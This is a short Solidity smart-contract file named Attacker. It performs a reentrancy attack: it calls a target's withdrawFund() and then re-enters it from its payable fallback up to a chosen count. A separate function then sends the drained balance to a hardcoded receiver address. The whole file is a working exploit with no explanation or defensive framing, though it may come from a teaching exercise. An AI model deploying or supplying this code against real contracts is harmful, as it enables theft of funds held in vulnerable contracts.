pragma solidity ^0.4.17;
contract Attacker{
    address receiver = 0x0d0ff5d76143d10c0a36ce58ac85c790417ed2ab; // Meng's address
    uint stack = 0;
    uint stackLimit = 10;

    function attack(address target, uint count) {
      stack = 0;
      stackLimit = count;
      target.call(bytes4(sha3("withdrawFund()")));
    }

    function() payable {
      if(stack++ < stackLimit) {
        msg.sender.call(bytes4(sha3("withdrawFund()")));
      }
    }

    function withdraw() {
      receiver.call.value(this.balance)();
    }

    function getBalance() public view returns (uint) {
      return this.balance;
    }
}
